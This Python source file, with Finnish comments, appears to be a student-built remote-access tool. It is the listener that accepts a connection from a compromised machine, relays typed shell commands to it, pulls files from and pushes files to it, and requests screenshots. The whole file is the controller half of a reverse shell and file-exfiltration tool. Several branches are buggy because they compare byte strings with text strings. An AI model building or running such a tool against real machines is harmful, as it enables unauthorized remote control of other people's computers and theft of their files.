import tkinter as tk
from tkinter import ttk, Text
import socket
from commands import Commands
import subprocess

socket.setdefaulttimeout(15)

class MainServer(tk.Tk):
    def __init__(self, ip:str, port:int):
        super().__init__()
        self.ip = ip
        self.port = port
        
        #luodaan uusi socket objekti käyttämällä socket-funktiota
        # #af_inet == ipv4, sock_stream == tcp-yhteys
        # #bindataan ip & portti -> listen == maksimiyhteydet
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #self.s.setsockopt(socket.AF_INET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.ip, self.port))
        self.s.listen(1)
        print('[+] Waiting for connection...\n')
        self.client, self.client_addr = self.s.accept()
        #accept metodi palauttaa -> target == itse yhteys kohteeseen
        # # target_addr == tuple jossa index0 :ssa targetin ip ja index1:ssa väliaikaisportti
        print(f'[+] New connection from {self.client_addr[0]}')

        self.command = Commands(self)

        while True:
                #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
            #command = self.teksti.bind('<Return>', lambda event :execute())
            command = input('>> ').encode()
                    
            if command == 'exit':      #byteinä koska muutettiin se edellisellä rivillä
                self.client.send(self.command)    #vaikka lopetetaan niin kuitenkin tieto kohteeseen
                self.client.close()
                self.s.close()
                break
            elif command == b'':
                continue
            elif command == b'cls':
                self.command.clear_screen()
            # elif command == (b'download'):
            #     self.client.send(command)
            #     self.command.download(self.client,command)
                # elif command.startswith(b'upload'):
                #     upload(target,command)
                #      continue
            elif command[:8] == 'download':
                file_output = self.command.recv_data()
                if file_output == b'not found':
                    print('no file')
                    continue
                with open(command[9:], 'wb') as write_data:
                    write_data.write(file_output)
                continue
            elif command[:6] == 'upload':
                try:
                    with open(command[7:], 'rb') as data:
                        data_read = data.read()
                except FileNotFoundError:
                    print('File not found')
                else:
                    self.command.send_data(data_read)
                continue
            elif command == b'screen':
                print('Taking screenshot')
                self.client.send(command)
            else:
                self.client.send(command)
                #4kilotavua (pitäisi riittää) dataa back & decodataan bytet stringeiksi
                result = self.client.recv(4096).decode('ISO-8859-1')
                print(result)

if __name__ == "__main__":
    with open('ip.txt', 'r') as iipee:
        iipee = iipee.readline()

    appi = MainServer(iipee, 80) #172.20.16.61 Jorma, 192.168.56.1 UbU
    appi.mainloop()
